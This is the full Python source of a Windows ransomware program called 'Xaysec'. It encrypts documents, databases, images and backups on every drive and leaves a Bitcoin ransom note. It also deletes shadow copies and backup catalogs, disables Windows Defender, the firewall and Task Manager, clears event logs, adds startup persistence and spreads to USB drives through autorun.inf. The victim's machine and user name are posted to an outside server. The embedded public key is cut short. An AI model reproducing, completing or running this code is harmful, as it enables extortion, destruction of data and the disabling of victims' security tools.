import os
import sys
import ctypes
import threading
import string
import random
import time
import subprocess
import shutil
from pathlib import Path
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.backends import default_backend
import requests

PUBLIC_KEY_PEM = "-----BEGIN PUBLIC KEY-----\nMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAv+/Q1XbF7PCJ34VyV4A4\n0bkH4XZKzK0SqL4eP2F+H9fJmL5rMq8MR3b1P7v1L6T0V+9u9O9nG/9L0HwT3XQ\njvK4rS5t6L0mXq1XbGfH6P+RwT9D+0bKvXqN+5O0T1nX2qVjXZP0rK9oF1t3a2h\n+8r5Xv7f4sT5YwL0XqRf8jKtUo3nT6Y0VcXaDgL7uP2Xn5q8w1xTjQ1Xc7bG4Yv\n1aVj8v+0eKt4mQ6ZbFpP+T9gN+3YhU4KjM2s8rL5kXo1+6P7qT9wXlZvCq1f3bG\nUjO2Xq1T+V2rM6kP9dLgFjP1bM6XzVnN5U+7fXo8oX+2rP9aQmN1XjL5vZqBjXf\nLtR8wN9oTmXbPj+1sGpQ6ZcK5jM2oXhT+ZqU7VnL0jN2vYpXr9XjOzT+RfWtM1b\nBk1qK3Xm0Tq7dZfU3sI4qVf1jP2lN+6R0qHq1oXjT3mC5vQmFzBdV9eTnLg2w1o\nGpY1Xj4mK8rN3XoYz+0tZfU6P2kQzJ1wI4XqD0cVnQ3Zq5P8mBk7rT+R5LgTj1X\nVk7a3o2QyUf1sV5cHmX0Wj3N+P7fLgKqZ5t6QoX1XmBf4oTqM2ZvRfPqH8jT5wL\nUz1YhK6nG1v7yTj3rP4sQj1wM0XoD2aVfG5bVnL+9mYqH8XcQ5xTgPk2oZq1Wf1\nC5zR+8jUq2rM9XgS6YvT8sV7wN2bF1lO5XqUjQr2ZtJ1fQ0pKmYr2ZvU2nP+XrL\nj7y1mP5sW0ZvQ1q8T+XgZjO1sQ+Rf3bBgFqO3hK0v8hP4XwL5jRzD0gXf7vK1qU\nwL4sMlN+2ZbK9j8P4qG9vQmFjT+XlC7yBqKpY1hQ8zVhP0rU5vZfWxO7kN6jU9i\nA1oU0nVjM6Qz+YqX4qW1TfK7gX2pP9Z0aFqV5fB1hRjTqO3X2sV+3qGzB7tM2nK\n5N1jW0lQyKv0jP+XgFqZ3vW8ZqY2oR9gU2sXjQkP1nM4zS6VcP4TqYlFqW0eF5v\n... (potong)\n-----END PUBLIC KEY-----"

PUBLIC_KEY = serialization.load_pem_public_key(PUBLIC_KEY_PEM.encode(), backend=default_backend())

TARGET_EXTENSIONS = {
    '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf',
    '.txt', '.csv', '.rtf', '.odt', '.ods', '.odp',
    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.ico',
    '.mp3', '.wav', '.wma', '.aac', '.flac', '.ogg',
    '.mp4', '.avi', '.mov', '.mkv', '.wmv', '.flv',
    '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2',
    '.db', '.sql', '.sqlite', '.mdb', '.accdb',
    '.html', '.php', '.asp', '.aspx', '.js', '.css',
    '.py', '.java', '.c', '.cpp', '.h', '.cs', '.vb',
    '.ps1', '.bat', '.cmd', '.sh',
    '.ini', '.cfg', '.conf', '.log',
    '.xml', '.json', '.yaml', '.yml', '.toml',
    '.svg', '.psd', '.ai', '.eps',
    '.key', '.pem', '.crt', '.cert', '.pfx',
    '.iso', '.img', '.vmdk', '.vhd', '.vhdx',
    '.bak', '.old', '.tmp', '.temp',
    '.dat', '.dbf', '.frm', '.ibd', '.myd', '.myi',
    '.ost', '.pst', '.msg', '.eml',
    '.crypt', '.enc', '.locked',
}

RANSOM_NOTE_NAME = "Xaysec_ReadMe.txt"
RANSOM_NOTE_TEMPLATE = """ALL YOUR FILES ARE ENCRYPTED
Military-grade encryption has locked your documents, databases, photos, and all important data.
Recovery is only possible with the private key held by us.

Payment: 1000 USD in Bitcoin to address: bc1qvd00grpp3kea4nlgexvv7ktam62fv9lepfyt6w
After payment, email leakserversupport@gmail.com with your Victim ID: {victim_id}
You will receive the decryption tool within 12 hours.

Free decryption test for 1 small file: visit https://xaysec.zya.me/

Do not rename or modify encrypted files. Third-party tools will cause permanent loss.
"""

VICTIM_ID = ''.join(random.choices(string.ascii_uppercase + string.digits, k=24))

def aes_encrypt(key, plaintext):
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    pad_len = 16 - (len(plaintext) % 16)
    plaintext += bytes([pad_len] * pad_len)
    return iv + encryptor.update(plaintext) + encryptor.finalize()

def rsa_encrypt_key(aes_key):
    return PUBLIC_KEY.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def run_hidden(cmd):
    subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)

def disable_recovery_and_security():
    commands = [
        'vssadmin delete shadows /all /quiet',
        'wmic shadowcopy delete',
        'bcdedit /set {default} recoveryenabled No',
        'bcdedit /set {default} bootstatuspolicy ignoreallfailures',
        'wbadmin delete catalog -quiet',
        'powershell -Command "Get-WmiObject Win32_Shadowcopy | ForEach-Object { $_.Delete() }"',
        'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f',
        'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Backup\\Client" /v DisableBackupLauncher /t REG_DWORD /d 1 /f',
        'sc stop WinDefend',
        'sc config WinDefend start= disabled',
        'sc stop MsMpSvc',
        'sc config MsMpSvc start= disabled',
        'sc stop SecurityHealthService',
        'sc config SecurityHealthService start= disabled',
        'sc stop wscsvc',
        'sc config wscsvc start= disabled',
        'sc stop WdNisSvc',
        'sc config WdNisSvc start= disabled',
        'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
        'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f',
        'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f',
        'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f',
        'netsh advfirewall set allprofiles state off',
        'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f',
        'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f',
        'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v NoRun /t REG_DWORD /d 1 /f',
        'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f',
        'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f',
        'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f',
    ]
    for cmd in commands:
        try:
            run_hidden(cmd)
        except:
            pass

def clear_logs():
    logs = ['Application', 'Security', 'System', 'Windows PowerShell']
    for log in logs:
        run_hidden(f'wevtutil cl {log}')

def setup_persistence():
    exe_path = sys.executable
    if exe_path.endswith('.exe'):
        run_hidden(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Xaysec /t REG_SZ /d "{exe_path}" /f')
        startup = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
        try:
            shutil.copy(exe_path, os.path.join(startup, 'Xaysec.exe'))
        except:
            pass

def infect_usb():
    exe = sys.executable
    if not exe.endswith('.exe'):
        return
    for d in string.ascii_uppercase:
        drive = f"{d}:\\"
        if os.path.exists(drive) and ctypes.windll.kernel32.GetDriveTypeW(drive) == 2:
            try:
                shutil.copy(exe, os.path.join(drive, 'Xaysec.exe'))
                with open(os.path.join(drive, 'autorun.inf'), 'w') as f:
                    f.write('[AutoRun]\nopen=Xaysec.exe\naction=Open folder\n')
            except:
                pass

def report_victim():
    try:
        info = {
            'id': VICTIM_ID,
            'pc': os.environ.get('COMPUTERNAME', ''),
            'user': os.environ.get('USERNAME', '')
        }
        requests.post('https://xaysec.zya.me/report', data=info, timeout=5)
    except:
        pass

def process_file(file_path):
    if file_path.suffix.lower().endswith('.xaysec'):
        return
    ext = file_path.suffix.lower()
    if ext not in TARGET_EXTENSIONS:
        return
    try:
        aes_key = os.urandom(32)
        with open(file_path, 'rb') as f:
            data = f.read()
        encrypted = aes_encrypt(aes_key, data)
        enc_key = rsa_encrypt_key(aes_key)
        new_path = file_path.with_suffix(file_path.suffix + '.Xaysec')
        key_path = file_path.with_name(file_path.name + '.Xaysec.key')
        with open(new_path, 'wb') as f:
            f.write(encrypted)
        with open(key_path, 'wb') as f:
            f.write(enc_key)
        os.remove(file_path)
    except:
        pass

def encrypt_directory(directory):
    note = os.path.join(directory, RANSOM_NOTE_NAME)
    try:
        with open(note, 'w') as f:
            f.write(RANSOM_NOTE_TEMPLATE.format(victim_id=VICTIM_ID))
    except:
        pass
    try:
        for entry in os.listdir(directory):
            full = os.path.join(directory, entry)
            if os.path.isfile(full):
                process_file(Path(full))
    except:
        pass

def worker(drive):
    for root, dirs, files in os.walk(drive):
        encrypt_directory(root)

def main():
    if is_admin():
        disable_recovery_and_security()
        clear_logs()
        setup_persistence()
        infect_usb()
    report_victim()
    drives = [f"{d}:\\" for d in string.ascii_uppercase if os.path.exists(f"{d}:\\")]
    threads = []
    for drv in drives:
        t = threading.Thread(target=worker, args=(drv,))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

if __name__ == "__main__":
    main()